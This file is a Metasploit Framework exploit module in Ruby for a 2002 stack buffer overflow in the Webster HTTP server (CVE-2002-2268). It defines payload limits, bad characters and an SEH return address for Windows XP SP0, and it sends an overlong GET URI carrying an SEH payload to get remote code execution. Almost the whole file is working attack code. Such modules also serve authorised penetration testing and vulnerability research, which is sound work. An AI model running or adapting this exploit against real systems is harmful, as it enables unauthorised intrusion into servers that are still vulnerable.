##
# $Id: webster_http.rb 10887 2010-11-03 12:19:19Z patrickw $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::HttpClient
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Webster HTTP Server GET Buffer Overflow',
			'Description'    => %q{
					This exploits a stack buffer overflow in the Webster HTTP server.
					The server and source code was released within an article from
					the Microsoft Systems Journal in February 1996 titled "Write a
					Simple HTTP-based Server Using MFC and Windows Sockets".
			},
			'Author'         => [ 'patrick' ],
			'Version'        => '$Revision: 10887 $',
			'References'     =>
				[
					[ 'CVE', '2002-2268' ],
					[ 'OSVDB', '44106' ],
					[ 'BID', '6289' ],
					[ 'URL', 'http://www.microsoft.com/msj/archive/s25f.aspx' ],
					[ 'URL', 'http://www.netdave.com/webster/webster.htm' ],
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'Space'       => 1024,
					'DisableNops' => true,
					'BadChars'    => "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0', 	{ 'Ret' => 0x71aa32ad } ] , # pop esi; pop ebx; ret ws2help.dll winxp
					[ 'Debug', 		{ 'Ret' => 0x44434241 } ] , # todo - add more targets.
				],
			'DisclosureDate' => 'Dec 02 2002',
			'DefaultTarget'  => 0))
	end

	def exploit
		print_status("Sending request...")
		seh = generate_seh_payload(target.ret)

		send_request_raw({
			'uri' => "/" + Rex::Text.rand_text_alphanumeric(266) + seh
		}, 2)

		handler
	end

end
